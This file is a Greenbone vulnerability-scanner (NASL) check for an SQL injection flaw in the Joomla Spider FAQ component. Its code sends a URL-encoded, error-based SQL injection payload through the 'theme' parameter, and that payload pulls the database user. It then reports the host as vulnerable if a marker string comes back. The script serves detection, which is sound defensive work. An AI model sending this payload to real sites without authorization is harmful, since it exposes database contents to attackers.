# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:joomla:joomla";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805499");
  script_version("2023-07-25T05:05:58+0000");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2023-07-25 05:05:58 +0000 (Tue, 25 Jul 2023)");
  script_tag(name:"creation_date", value:"2015-03-26 10:48:48 +0530 (Thu, 26 Mar 2015)");
  script_tag(name:"qod_type", value:"remote_vul");

  script_name("Joomla Spider-FAQ SQLi Vulnerability");

  script_tag(name:"summary", value:"The Joomla Spider FAQ component is prone to an SQL injection (SQLi) vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and check whether it is able to execute
sql query or not.");

  script_tag(name:"insight", value:"Flaw is due to joomla component Spider FAQ is not filtering data in 'theme'
and 'Itemid' parameters.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to inject or manipulate
SQL queries in the back-end database, allowing for the manipulation or disclosure of arbitrary data.");

  script_tag(name:"affected", value:"Joomla Spider FAQ component.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade
to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/36464");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/130962");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_mandatory_keys("joomla/installed");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/index.php?option=com_spiderfaq&view=spiderfaqmultiple&standcat=0"+
            "&faq_cats=,2,3,&standcatids=&theme=4%20and%28select%201%20"+
            "FROM%28select%20count%28*%29,concat%28%28select%20%28select%20concat%28user"+
            "%28%29,SQL-INJECTION-TEST40,x27,0x7e%29%29%20FROM%20information_schem"+
            "a.tables%20LIMIT%200,1%29,floor%28rand%280%29*2%29%29x%20FROM%20information"+
            "_schema.tables%20GROUP%20BY%20x%29a%29--%20-%20&searchform=1&expand=0&Itemid=109";

host = http_host_name(port:port);

req = string("GET ", url, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n\r\n");
res = http_keepalive_send_recv(port:port, data:req);

if(res && "SQL-INJECTION-TEST" >< res && ">Error:" >< res && "spiderfaq" >< res) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);